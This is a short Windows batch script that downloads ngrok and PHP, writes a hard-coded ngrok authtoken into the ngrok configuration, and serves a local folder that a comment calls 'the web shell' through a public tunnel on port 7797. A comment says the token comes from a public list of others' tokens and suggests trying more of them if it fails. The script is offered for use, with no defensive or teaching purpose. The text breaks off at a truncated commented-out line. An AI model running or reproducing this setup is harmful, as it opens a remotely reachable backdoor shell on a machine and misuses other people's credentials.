REM  Download and unzip ngrok client
curl https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -o ngrok.zip
tar -xf %cd%\ngrok.zip

REM Download and install PHP
curl https://windows.php.net/downloads/releases/php-devel-pack-8.3.2-Win32-vs16-x64.zip -o php.zip
tar -xf %cd%\php.zip

REM  COMMENT SECTION
REM  I got this free authtoken from this list here https://gist.github.com/aels/4b26aa8bd9db8108e171ffbe81cdf776
REM  in case of ngrok failing try other tokens or register at ngrok.com and get free authtoken

echo %cd%\ngrok.exe config add-authtoken 26p3rvZocfT7VzraejQNoCjPNN6_6UqEGG1izGcbE8ewtBchT >actual.cmd
echo %cd%\ngrok.exe http 7797 >>actual.cmd
%cd%\actual.cmd

REM Start the web shell locally
echo Starting the web shell locally
%cd%\php\php.exe -S 127.0.0.1:7797 -t ./

REM start /B ..\..\mi...

